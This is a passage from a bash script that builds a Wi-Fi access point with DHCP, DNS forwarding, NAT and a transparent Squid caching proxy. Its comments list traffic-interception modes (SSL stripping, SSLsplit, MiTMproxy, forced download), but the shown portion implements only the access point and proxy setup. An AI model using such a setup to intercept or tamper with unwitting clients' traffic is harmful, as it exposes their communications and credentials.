	# Uncomment the following to see debug messages.
	#xterm -geometry -0-0 -e "hostapd -d $HOME_DIR/hostapd.conf" > /dev/null &
	# If you uncomment the above you MUST comment the following.
	hostapd -B $HOME_DIR/hostapd.conf > /dev/null &
	$cecho "\r[ "$GREEN"ok"$END" ] Starting Hostapd. (conf file:$HOME_DIR/hostapd.conf)"
fi

#################################################################################################################
# 			Debug (uncomment to see if our variables are correct)					#
#################################################################################################################
#$cecho ""IFACE": $IFACE"
#$cecho ""WIFACE": $WIFACE"
#$cecho ""ATFACE": $ATFACE"
#$cecho ""WIFACE_MON": $WIFACE_MON"
#$cecho ""ATHDRV": $ATHDRV"
#$cecho ""INETIP": $INETIP"
#$cecho ""Alternative DNS1": $Alt_DNS1"
#$cecho ""Alternative DNS2": $Alt_DNS2"
#$cecho ""DNS1": $DNS1"
#$cecho ""DNS2": $DNS2"
#$cecho ""$WLNMODE": $WLNMODE"

#################################################################################################################
# 		If secondary DNS server was founded then use it in udhcpd.conf					#
# 				2 DNS servers are enough							#
#################################################################################################################
OPDNS="$DNS1"
if [ -n "$DNS2" ]; then
	OPDNS=$OPDNS", "$DNS2""
fi

#################################################################################################################
# 		create custom dhcpd.conf for WLAN-----DISABLED for now!						#
#################################################################################################################
#cat > /etc/dhcp3/dhcpd.conf << EOF										#
#ddns-update-style ad-hoc;											#
#default-lease-time 600;											#
#max-lease-time 7200;												#
#subnet 192.168.2.128 netmask 255.255.255.128 {									#
#option subnet-mask 255.255.255.128;										#
#option broadcast-address 192.168.2.255;									#
#option routers 192.168.2.129;											#
#option domain-name-servers $OPDNS;										#
#range 192.168.2.130 192.168.2.140;										#
#}														#
#EOF														#
#################################################################################################################

#################################################################################################################
# 					create custom udhcpd.conf for WLAN					#
#################################################################################################################
cat > /etc/udhcpd.conf << EOF
start			192.168.60.130
end			192.168.60.150
interface		$ATFACE
lease_file		/var/lib/misc/udhcpd.leases
auto_time	        120
pidfile			/var/run/udhcpd.pid
option	subnet		255.255.255.128
opt	router		192.168.60.129
opt 	broadcast	192.168.60.255
option	dns		$OPDNS	
option	domain		local
option	lease		$udhcpd_lease
EOF

#################################################################################################################
# 				Clean if exist udhcpd pid and leases files					#
#################################################################################################################
if [ -f /var/run/udhcpd.pid ];then
	cat /dev/null > /var/run/udhcpd.pid
fi

if [ -f /var/lib/misc/udhcpd.leases ];then
	cat /dev/null > /var/lib/misc/udhcpd.leases
else
	touch /var/lib/misc/udhcpd.leases
fi

#################################################################################################################
# 				Clean if exist squid's access.log and cache.log					#
#################################################################################################################
if [ -f /var/log/squid3/access.log ];then
	cat /dev/null > /var/log/squid3/access.log
	chown -R proxy:proxy /var/log/squid3/
fi

if [ -f /var/log/squid3/cache.log ];then
	cat /dev/null > /var/log/squid3/cache.log
	chown -R proxy:proxy /var/log/squid3/
fi

#################################################################################################################
# 			Delete (if exist) sarg's report or sarg's realtime folder				#
#################################################################################################################
if [ -d $HOME_DIR/squid-reports ];then
rm -r $HOME_DIR/squid-reports
fi

if [ -d /var/www/sarg-realtime  ];then
	rm -f -r /var/www/sarg-realtime/
fi

#################################################################################################################
# 			Create custom squid.conf (for squid3 3.1.20 version) and replace the original. 		#
#################################################################################################################

cat > /etc/squid3/squid.conf <<EOF
# Access Controls
acl manager proto cache_object
acl localhost src 127.0.0.1/32
acl localnet src 192.168.60.0/24  	# RFC1918 class C internal network (192.168.60.0 to 192.168.60.255)
acl SSL_ports port 443 563  	# https, snews
acl Safe_ports port 80 		# http
acl Safe_ports port 21 		# ftp
acl Safe_ports port 70 		# gopher
acl Safe_ports port 210 	# wais
acl Safe_ports port 1025-65535 	# unregistered ports
acl Safe_ports port 280 	# http-mgmt
acl Safe_ports port 488 	# gss-http
acl Safe_ports port 591 	# filemaker
acl Safe_ports port 777 	# multiling http
acl CONNECT method CONNECT
http_access allow manager localhost
http_access deny manager
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow localnet
http_access allow localhost
http_access deny all
icp_access deny all
htcp_access deny all

# Ports :3127 http proxy, 3128 http transparent.
http_port 3127
http_port 3128 transparent

# Lets use DNS servers that we have found and cache them
dns_nameservers $DNS1 $DNS2
positive_dns_ttl 6 hours
negative_ttl 30 seconds
negative_dns_ttl 60 seconds

hierarchy_stoplist cgi-bin ?

# Disk Cache Options (Get values from Free Disk/Memory calculation section)
#cache_dir $file_system /var/spool/squid3 $squid_hdd 16 256
#cache_replacement_policy heap LFUDA
#minimum_object_size 0 KB
#maximum_object_size $squid_max_obj_size
#cache_swap_low 90
#cache_swap_high 95

# Memory Cache Options (Get values from Free Disk/Memory calculation section)
cache_mem $squid_mem MB
maximum_object_size_in_memory $squid_max_obj_size_mem
memory_replacement_policy heap GDSF

# Log files for 3.1.x & 3.3.x
coredump_dir /var/spool/squid3
access_log /var/log/squid3/access.log squid
#access_log stdio:/var/log/squid3/access.log squid
cache_log /var/log/squid3/cache.log

# Simple refresh pattern
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern (cgi-bin|\?)    0       0%      0
refresh_pattern .               0       20%     4320
icp_port 3130
always_direct allow all

# Get values from Free Disk/Memory calculation section.
# How many instances of redirect.pl script will be used? (Get values from Free Memory calculation section)
#url_rewrite_program /usr/local/bin/redirect.pl
#redirect_children $rdr_chil startup=$rdr_chil_strup idle=$rdr_chil_idle concurrency=$rdr_chil_conc
#url_rewrite_children $rdr_chil startup=$rdr_chil_strup idle=$rdr_chil_idle concurrency=$rdr_chil_conc
EOF

# Check what version of Squid3 we are running
# and customize properly for 3.3.x version
# put percentage $prcent to 100 for squid3.3.8 and 999999 for squid 3.1.20
# $prcent will be used in high speed proxied wlan
# TODO : BackTrack 5R3 compatible?

export Squid_ver="`squid3 -v | grep "Version" | awk '{print $4}'`"

if [ "$OS" = "KALI_linux" ];then
	if [ "$Squid_ver" = "3.3.8" ];then
		#echo "Squid3 version 3.3.8"
		export prcent="100"
		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		#sed 's%#http_port 3127%http_port 3127%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		#sed 's%%%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		#sed 's%%%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
	elif [ "$Squid_ver" = "3.1.20" ];then
		#echo "Squid3 version 3.1.20"
		export prcent="999999"
		#sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
	fi
elif [ "$OS" = "BackTrack_5R3" ];then
	if [ "$Squid_ver" = "3.3.8" ];then
		#echo "Squid3 version 3.3.8"
		export prcent="100"
		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		#sed 's%#http_port 3127%http_port 3127%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		#sed 's%%%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		#sed 's%%%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
	elif [ "$Squid_ver" = "3.1.20" ];then
		#echo "Squid3 version 3.1.20"
		export prcent="999999"
		#sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
	fi
fi

#################################################################################################################
# 				Create custom proxychains.conf and replace the original.			#
#################################################################################################################
cat > /etc/proxychains.conf << EOF
strict_chain
# Quiet mode (no output from library)
#quiet_mode
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
http 192.168.60.129 3127
EOF

#################################################################################################################
# 					Create custom dnsmasq.conf.						#
#################################################################################################################
cat > $HOME_DIR/dnsmasq.conf << EOF
# Configuration file for dnsmasq.
filterwin2k
interface=$ATFACE
no-dhcp-interface=$ATFACE
domain-needed
bogus-priv
no-hosts
dns-forward-max=150
cache-size=1000
neg-ttl=3600
EOF

#################################################################################################################
# 			Modifying proxyresolv to use our WLAN gateway 192.168.60.129				#
#################################################################################################################
if [ -n "`grep 'DNS_SERVER=4.2.2.2' $proxyresolv_path/proxyresolv`" ];then
sed 's%DNS_SERVER=4.2.2.2%DNS_SERVER=192.168.60.129%g' $proxyresolv_path/proxyresolv > $proxyresolv_path/proxyresolv1 && mv $proxyresolv_path/proxyresolv1 $proxyresolv_path/proxyresolv
sed 's%dig $1 @$DNS_SERVER +tcp%dig $1 @$DNS_SERVER%g' $proxyresolv_path/proxyresolv > $proxyresolv_path/proxyresolv1 && mv $proxyresolv_path/proxyresolv1 $proxyresolv_path/proxyresolv
chmod +x $proxyresolv_path/proxyresolv
fi

#################################################################################################################
# 					SoftAP up and running							#
#################################################################################################################
ifconfig $ATFACE up
ifconfig $ATFACE 192.168.60.129 netmask 255.255.255.128
route add -net 192.168.60.128 netmask 255.255.255.128 gw 192.168.60.129
ifconfig $ATFACE mtu $MTU_SIZE

#################################################################################################################
# 				Start udhcpd server for subnet							#
#################################################################################################################
$necho "[....] Starting UDHCPD server for subnet.(conf file: /etc/udhcpd.conf)"
/etc/init.d/udhcpd start > /dev/null &
$cecho "\r[ "$GREEN"ok"$END" ] Starting UDHCPD server for subnet.(conf file: /etc/udhcpd.conf)"


#################################################################################################################
# 					Solve our DNS Forwarder							#
#################################################################################################################
$necho "[....] Starting DNSMASQ - DNS Forwarder.(conf file: $HOME_DIR/dnsmasq.conf)"
/usr/sbin/dnsmasq --conf-file=$HOME_DIR/dnsmasq.conf > /dev/null &
$cecho "\r[ "$GREEN"ok"$END" ] Starting DNSMASQ - DNS Forwarder.(conf file: $HOME_DIR/dnsmasq.conf)"


#################################################################################################################
# 			Let's see who is connected, WLAN's statistics, their IP address etc			#
# 			We can't use iw dev $WIFACE station dump when airbase-ng is used			#
#################################################################################################################
if [ "$ATHDRV" = "hostapd" ] || [ "$ATHDRV" = "hostapd_madwifi" ];then
	Who_is_connected_and_statistics(){
	xterm -geometry 80x40-0+0 -e watch -n 1 -c -t "echo '\033[1;32mList of connected clients & statistic informations:\033[1;37m';iw dev $WIFACE station dump;echo '\033[1;32mLeases granted by udhcp server:\033[1;37m';dumpleases -f /var/lib/misc/udhcpd.leases"&
	}
elif [ "$ATHDRV" = "monitor" ] || [ "$ATHDRV" = "no" ];then
	Who_is_connected_and_statistics(){
	xterm -geometry 80x20-0+0 -e watch -n 1 -c -t "echo '\033[1;32mLeases granted by udhcp server:\033[1;37m';dumpleases -f /var/lib/misc/udhcpd.leases"&
	}
fi

#################################################################################################################
#                                                WLAN modes:							#
#														#
#					Mode:	Simple WLAN							#
#					Mode:	High Performance Proxied WLAN					#
#					Mode:	Air chat							#
#					Mode:	Anonymous Surfing - Deep Web access TOR				#
#					Mode:	Anonymous Surfing - Deep Web access I2P				#
#					Mode:	SSLstriped							#
#					Mode:	Proxied & SSLstriped						#
#					Mode: 	- Flipped							#
#						- Blurred							#
#						- Swirled							#
#					Mode:	ASCII								#
#					Mode:	Tourette							#
#					Mode:	Forced download							#
#					Mode:	SSLsplit							#
#					Mode:	MiTMproxy							#
#					Mode:	HoneyProxy							#
#					Mode:	Squid in The Middle						#
#################################################################################################################


#################################################################################################################
# 						Mode: Simple WLAN 						#
#					Clients can access the Internet directly				#
#################################################################################################################
if [ "$WLNMODE" = "Simple" ];then
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP
iptables -A INPUT -p udp -s 192.168.60.0/24 --dport 53 -j ACCEPT 
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
echo
echo "Your clients now can access the Internet."
echo "There is no interception, no nothing."
echo ""$friendly_name" is acting as an Access Point."
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 			Mode: Transparent HTTP Proxied WLAN Optimized for Low Internet Speeds			#
#				Clients can access Internet - Transparently proxied				#
#														#
# https://github.com/ypid/squid3-config										#
#################################################################################################################
if [ "$WLNMODE" = "Proxied" ];then

# mkdir /var/www/cgi-bin
# /usr/lib/cgi-bin/cachemgr.cgi
# cp /usr/lib/cgi-bin/cachemgr.cgi /var/www/cgi-bin/
# $browser http://127.0.0.1/cgi-bin/cachemgr.cgi &

# Let's write our storeurl script
# The script will effect: .google.com .google.de .tiles.virtualearth.net map.org .tile.cloudmade.com dstdomain 
# .tile.openstreetmap.org .tile.opencyclemap.org .tiles.mapbox.com .wheelmap.org .www.toolserver.org 
# .tiles.osm2world.org .skobbler.net .tile.openstreetmap.de .itoworld.com .map.f4-group.com
#
#http://code.google.com/p/ghebhes/downloads/list

cat > /etc/squid3/url_rewrite << "EOF"
#!/usr/bin/env perl
## @author Robin Schneider <ypid23@aol.de>
## @licence GPLv3 <http://www.gnu.org/licenses/gpl.html>
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation version 3 of the License.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.

use strict;
use warnings;
use autodie;
use utf8;
# use feature qw(say);

# use Sys::Syslog qw( :DEFAULT setlogsock );
# setlogsock('unix');
# openlog($0,'','user');

# To allow load balancing please choose other default settings at the beginning.
my $server_num  =  0;   # values between 0 and 2 should work on all servers.
my $server_char = 'a'; # values between a and c should work on all servers.

$| = 1;
while (<>) {
    my $new_URL = q( );
    if (m#\Ahttp://(khm?)(?:[^/]*?)\.(google\.(?:de|com).*)#xms) {
        $new_URL = "http://${1}0.$2";
    } elsif (m#\Ahttp://mt[^/]*?\.(google\.com.*)\z#xms) {
        $new_URL = "http://mt$server_num.$1";
    } elsif (m#\Ahttp://[^/]+?(tile\.(?:cloudmade\.com|open(?:\w*?)map\.org)/.*)#xms) {
        $new_URL = "http://$1";
    } elsif (m#\Ahttp://\w\.(www\.toolserver\.org/.*)#xms) {
        $new_URL = "http://$server_char.$1";
    } elsif (m#\Ahttp://tiles\d\.(map\.f4-group\.com/.*)#xms) {
        $new_URL = "http://tiles$server_num.$1";
    } elsif (m#\Ahttp://t\d\.((?:beta\.)?itoworld\.com/.*)#xms) {
        $new_URL = "http://t$server_num.$1";
    } elsif (m#\Ahttp://asset\d\.(wheelmap\.org/.*)#xms) {
        $new_URL = "http://asset$server_num.$1";
    } elsif (m#\Ahttp://\w\.(tiles\.mapbox\.com/.*)#xms) {
        $new_URL = "http://$server_char.$1";
    } elsif (m#\Ahttp://[^/]*?t\d\.(tiles\.virtualearth\.net/.*)#xms) {
        $new_URL = "http://t$server_num.$1";
    # } elsif (m/^http:\/\/([A-Za-z]*?)-(.*?)\.(.*)\.youtube\.com\/get_video\?video_id=(.*) /) {
        # # http://lax-v290.lax.youtube.com/get_video?video_id=jqx1ZmzX0k0
        # print "http://video-srv.youtube.com.SQUIDINTERNAL/get_video?video_id=" . $4;
    }
    if ($new_URL eq q( )) {
        # syslog('info', "Squid no rewrite: $_");
        print;
    }
    else {
        # syslog('info', "Squid rewrite: New URL: $new_URL");
        print $new_URL;
    }
}
# closelog;
EOF

# Make it executable
chmod 755 /etc/squid3/url_rewrite


# Let's create a new optimized for Speed and Performance squid3.conf.

cat > /etc/squid3/squid.conf <<EOF
# Access Controls
acl manager proto cache_object
acl localhost src 127.0.0.1/32
acl localnet src 192.168.60.0/24  	# RFC1918 class C internal network (192.168.60.0 to 192.168.60.255)
acl SSL_ports port 443 563  	# https, snews
acl Safe_ports port 80 		# http
acl Safe_ports port 21 		# ftp
acl Safe_ports port 70 		# gopher
acl Safe_ports port 210 	# wais
acl Safe_ports port 1025-65535 	# unregistered ports
acl Safe_ports port 280 	# http-mgmt
acl Safe_ports port 488 	# gss-http
acl Safe_ports port 591 	# filemaker
acl Safe_ports port 777 	# multiling http
acl CONNECT method CONNECT
http_access allow manager localhost
http_access deny manager
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow localnet
http_access allow localhost
http_access deny all
icp_access deny all
always_direct allow all

# Ports :3127 http proxy, 3128 http transparent.
http_port 3127
http_port 3128 transparent

# Lets use DNS servers that we have found and cache them.
dns_nameservers $DNS1 $DNS2
positive_dns_ttl 6 hours
negative_ttl 30 seconds
negative_dns_ttl 60 seconds

# Disk Cache Options (Get values from Free Disk/Memory calculation section)
cache_dir $file_system /var/spool/squid3 $squid_hdd 16 256
cache_replacement_policy heap LFUDA
minimum_object_size 0 KB
maximum_object_size $squid_max_obj_size
cache_swap_low 90
cache_swap_high 95

# Memory Cache Options (Get values from Free Disk/Memory calculation section)
cache_mem $squid_mem MB
memory_replacement_policy heap GDSF
maximum_object_size_in_memory $squid_max_obj_size_mem

# Log files for 3.1.x & 3.3.x
coredump_dir /var/spool/squid3
access_log /var/log/squid3/access.log squid
#access_log stdio:/var/log/squid3/access.log squid
cache_log /var/log/squid3/cache.log
cache_store_log /var/log/squid3/store.log

#url rewrite script
url_rewrite_program /etc/squid3/url_rewrite
redirect_children $rdr_chil startup=$rdr_chil_strup idle=$rdr_chil_idle concurrency=$rdr_chil_conc
#url_rewrite_children $rdr_chil startup=$rdr_chil_strup idle=$rdr_chil_idle concurrency=$rdr_chil_conc

acl url_rewrite_list dstdomain .google.com .google.de .tiles.virtualearth.net
acl url_rewrite_list dstdomain map.org .tile.cloudmade.com
acl url_rewrite_list dstdomain .tile.openstreetmap.org .tile.opencyclemap.org .tiles.mapbox.com .wheelmap.org .www.toolserver.org .tiles.osm2world.org .skobbler.net .tile.openstreetmap.de
acl url_rewrite_list dstdomain .itoworld.com .map.f4-group.com
url_rewrite_access allow url_rewrite_list
url_rewrite_access deny all

acl video urlpath_regex -i \.(m2a|avi|mov|mp(e?g|a|e|1|2|3|4)|m1s|mp2v|m2v|m2s|wmx|rm|rmvb|3pg|3gpp|omg|ogm|asf|asx|wmvm3u8|flv|ts)
always_direct allow video

refresh_pattern -i (/cgi-bin/|\?)         0      0%      0
refresh_pattern \.(ico|video-stats)$ 43200 $prcent% 43200 override-expire ignore-reload ignore-no-cache ignore-no-store ignore-private ignore-auth override-lastmod ignore-must-revalidate
refresh_pattern imeem.*\.flv$                           0     0%         0 override-lastmod override-expire
refresh_pattern \.rapidshare.*\/[0-9]*\/.*\/[^\/]* 43200    90%    161280 ignore-reload

refresh_pattern (get_video\?|videoplayback\?|videodownload\?|\.flv?) 43200 $prcent% 43200 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims
refresh_pattern (get_video\?|videoplayback\?id|videoplayback.*id|videodownload\?|\.flv?) 43200 100% 43200 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims
refresh_pattern ^.*(utm\.gif|ads\?|rmxads\.com|ad\.z5x\.net|bh\.contextweb\.com|bstats\.adbrite\.com|a1\.interclick\.com|ad\.trafficmp\.com|ads\.cubics\.com|ad\.xtendmedia\.com|\.googlesyndication\.com|advertising\.com|yieldmanager|game-advertising\.com|pixel\.quantserve\.com|adperium\.com|doubleclick\.net|adserving\.cpxinteractive\.com|syndication\.com|media.fastclick.net).* 129600 20% 129600 ignore-no-cache ignore-no-store ignore-private override-expire ignore-reload ignore-auth ignore-must-revalidate

refresh_pattern ^.*safebrowsing.*google                                  43200 $prcent% 43200 override-expire ignore-reload ignore-no-cache ignore-private ignore-auth ignore-must-revalidate
refresh_pattern ^http://((cbk|mt|khm|mlt)[0-9]?)\.google\.co(m|\.uk)     43200 $prcent% 43200 override-expire ignore-reload ignore-private
refresh_pattern ytimg\.com.*\.jpg                                        43200 $prcent% 43200 override-expire ignore-reload
refresh_pattern images\.friendster\.com.*\.(png|gif)                     43200 $prcent% 43200 override-expire ignore-reload
refresh_pattern garena\.com                                              43200 $prcent% 43200 override-expire reload-into-ims
refresh_pattern photobucket.*\.(jp(e?g|e|2)|tiff?|bmp|gif|png)           43200 $prcent% 43200 override-expire ignore-reload
refresh_pattern vid\.akm\.dailymotion\.com.*\.on2\?                      43200 $prcent% 43200 ignore-no-cache override-expire override-lastmod
refresh_pattern mediafire.com\/images.*\.(jp(e?g|e|2)|tiff?|bmp|gif|png) 43200 $prcent% 43200 reload-into-ims override-expire ignore-private
refresh_pattern ^http:\/\/images|pics|thumbs[0-9]\.                      43200 $prcent% 43200 reload-into-ims ignore-no-cache ignore-no-store ignore-reload override-expire
refresh_pattern ^http:\/\/www.onemanga.com.*\/                           43200 $prcent% 43200 reload-into-ims ignore-no-cache ignore-no-store ignore-reload override-expire

# ANTI VIRUS
refresh_pattern guru.avg.com/.*\.(bin)                              1440 $prcent% 10080  ignore-no-cache ignore-no-store ignore-reload reload-into-ims
refresh_pattern (avgate|avira).*(idx|gz)$                           1440 $prcent% 10080  ignore-no-cache ignore-no-store ignore-reload reload-into-ims
refresh_pattern kaspersky.*\.avc$                                   1440 $prcent% 10080  ignore-no-cache ignore-no-store ignore-reload reload-into-ims
refresh_pattern kaspersky                                           1440 $prcent% 10080  ignore-no-cache ignore-no-store ignore-reload reload-into-ims
refresh_pattern update.nai.com/.*\.(gem|zip|mcs)                    1440 $prcent% 10080  ignore-no-cache ignore-no-store ignore-reload reload-into-ims
refresh_pattern ^http:\/\/liveupdate.symantecliveupdate.com.*\(zip) 1440 $prcent% 10080  ignore-no-cache ignore-no-store ignore-reload reload-into-ims

#Windows Update (LOL Windows!)
refresh_pattern windowsupdate.com/.*\.(cab|exe)                     10080 $prcent% 43200 ignore-no-cache ignore-no-store ignore-reload reload-into-ims
refresh_pattern update.microsoft.com/.*\.(cab|exe)                  10080 $prcent% 43200 ignore-no-cache ignore-no-store ignore-reload reload-into-ims
refresh_pattern download.microsoft.com/.*\.(cab|exe)                10080 $prcent% 43200 ignore-no-cache ignore-no-store ignore-reload reload-into-ims

#images facebook
refresh_pattern ((facebook.com)|(85.131.151.39)).*\.(jpg|png|gif) 129600 $prcent% 129600 ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern -i \.fbcdn.net.*\.(jpg|gif|png|swf|mp3)           129600 $prcent% 129600 ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern static\.ak\.fbcdn\.net*\.(jpg|gif|png)            129600 $prcent% 129600 ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern ^http:\/\/profile\.ak\.fbcdn.net*\.(jpg|gif|png)  129600 $prcent% 129600 ignore-reload override-expire ignore-no-cache ignore-no-store

# games facebook
refresh_pattern http:\/\/apps.facebook.com.*\/ 10080 $prcent% 43200 ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern -i \.zynga.com.*\/      10080 $prcent% 43200 ignore-reload override-expire ignore-no-cache ignore-no-store ignore-must-revalidate
refresh_pattern -i \.farmville.com.*\/  10080 $prcent% 43200 ignore-reload override-expire ignore-no-cache ignore-no-store ignore-must-revalidate
refresh_pattern -i \.ninjasaga.com.*\/  10080 $prcent% 43200 ignore-reload override-expire ignore-no-cache ignore-no-store ignore-must-revalidate
refresh_pattern -i \.mafiawars.com.*\/  10080 $prcent% 43200 ignore-reload override-expire ignore-no-cache ignore-no-store ignore-must-revalidate
refresh_pattern -i \.crowdstar.com.*\/  10080 $prcent% 43200 ignore-reload override-expire ignore-no-cache ignore-no-store ignore-must-revalidate
refresh_pattern -i \.popcap.com.*\/    	10080 $prcent% 43200 ignore-reload override-expire ignore-no-cache ignore-no-store ignore-must-revalidate

#banner IIX
refresh_pattern ^http:\/\/openx.*\.(jp(e?g|e|2)|gif|pn[pg]|swf|ico|css|tiff?) 129600 $prcent% 129600 reload-into-ims ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern ^http:\/\/ads(1|2|3).kompas.com.*\/                           43200  $prcent% 129600 reload-into-ims ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern ^http:\/\/img.ads.kompas.com.*\/                              43200  $prcent% 129600 reload-into-ims ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern .kompasimages.com.*\.(jpg|gif|png|swf)                        43200  $prcent% 129600 reload-into-ims ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern ^http:\/\/openx.kompas.com.*\/                                43200  $prcent% 129600 reload-into-ims ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern kaskus.\us.*\.(jp(e?g|e|2)|gif|png|swf)                       43200  $prcent% 129600 reload-into-ims ignore-reload override-expire ignore-no-cache ignore-no-store
refresh_pattern ^http:\/\/img.kaskus.us.*\.(jpg|gif|png|swf)                  43200  $prcent% 129600 reload-into-ims ignore-reload override-expire ignore-no-cache ignore-no-store

#IIX DOWNLOAD
refresh_pattern ^http:\/\/\.www[0-9][0-9]\.indowebster\.com\/(.*)(mp3|rar|zip|flv|wmv|3gp|mp(4|3)|exe|msi|zip) 43200 $prcent% 129600 reload-into-ims  ignore-reload override-expire ignore-no-cache ignore-no-store  ignore-auth
refresh_pattern -i ^http://(khm?)([^/]*?)\.google\.(de|com)     129600 $prcent% 129600 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims ignore-reload
refresh_pattern -i ^http://ecn\.t\d\.tiles\.virtualearth\.net/tiles/\w*\.jpeg     129600 $prcent% 129600 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims ignore-reload

refresh_pattern -i \.(3gp|7z|ace|asx|avi|bin|cab|dat|deb|rpm|divx|dvr-ms)      43200 $prcent% 43200 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims ignore-reload
refresh_pattern -i \.(rar|jar|gz|tgz|tar|bz2|iso|m1v|m2(v|p)|mo(d|v)|(x-|)flv) 43200 $prcent% 43200 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims ignore-reload
refresh_pattern -i \.(jp(e?g|e|2)|gif|pn[pg]|bm?|tiff?|ico|swf|css|js)         43200 $prcent% 43200 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims ignore-reload
refresh_pattern -i \.(mp(e?g|a|e|1|2|3|4)|mk(a|v)|ms(i|u|p))                   43200 $prcent% 43200 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims ignore-reload
refresh_pattern -i \.(og(x|v|a|g)|rar|rm|r(a|p)m|snd|vob|wav)                  43200 $prcent% 43200 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims ignore-reload
refresh_pattern -i \.(pp(s|t)|wax|wm(a|v)|wmx|wpl|zip|cb(r|z|t))               43200 $prcent% 43200 ignore-no-cache ignore-no-store ignore-private override-expire override-lastmod reload-into-ims ignore-reload

refresh_pattern ^gopher:  1440  0%  1440
refresh_pattern ^ftp:    10080 95% 43200 override-lastmod reload-into-ims
 
refresh_pattern -i \.(doc|pdf)$           100080 90% 43200 override-expire ignore-no-cache ignore-no-store ignore-private reload-into-ims
refresh_pattern -i \.(html|htm)$          1440   40% 40320 ignore-no-cache ignore-no-store ignore-private override-expire reload-into-ims
refresh_pattern (Release|Packages(.gz)*)$    0   20%  2880
refresh_pattern .                          180   95% 43200 override-lastmod reload-into-ims

log_icp_queries off
icp_port 0
htcp_port 0
snmp_port 0
buffered_logs on
vary_ignore_expire on
shutdown_lifetime 0 second
request_header_max_size 256 KB
half_closed_clients off
connect_timeout 15 second
client_db off
ipcache_low 50
check_hostnames off
forwarded_for delete
via off
reload_into_ims on
cache_store_log none
read_ahead_gap 20 MB
client_persistent_connections on
server_persistent_connections on
EOF

# Make squid.conf squid3 v3.1.20 or squid3 v3.3.8 compatible and Kali or BT5R3 compatible
# TODO: Test with BT5R3
if [ "$OS" = "KALI_linux" ];then
